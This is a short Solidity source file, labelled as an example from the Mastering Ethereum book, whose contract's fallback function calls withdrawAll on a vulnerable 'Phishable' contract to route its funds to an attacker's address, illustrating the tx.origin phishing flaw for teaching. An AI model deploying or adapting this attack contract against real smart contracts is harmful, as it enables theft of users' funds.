// SPDX-License-Identifier: CC-BY-SA-4.0

//Example from the Mastering Ethereum book
// Version of Solidity compiler this program was written for
pragma solidity ^0.6.4;

import "contracts/Phisable.sol";

contract AttackContract {

    Phishable phishableContract;
    address payable attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address payable _attackerAddress) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    fallback() payable external {
        phishableContract.withdrawAll(attacker);
    }
}
